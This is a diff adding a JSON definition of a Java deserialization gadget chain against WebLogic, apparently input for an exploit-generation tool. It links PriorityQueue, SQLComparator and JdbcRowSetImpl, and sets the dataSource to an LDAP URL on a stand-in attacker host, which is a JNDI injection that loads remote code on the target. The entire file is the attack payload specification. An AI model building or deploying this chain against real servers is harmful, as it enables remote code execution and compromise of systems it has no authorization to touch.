@@ -1,0 +1,21 @@
+{
+  "chain_type": "comparator_chain",
+  "description": "WebLogic SQLComparator: PriorityQueue -> SQLComparator.compare -> potential method invocation",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject\u2192heapify\u2192comparator.compare",
+  "links": [
+    {
+      "class": "weblogic.jdbc.rowset.SQLComparator",
+      "role": "bridge",
+      "field_overrides": {}
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "role": "sink",
+      "field_overrides": {
+        "dataSource": "ldap://attacker.example/evil"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
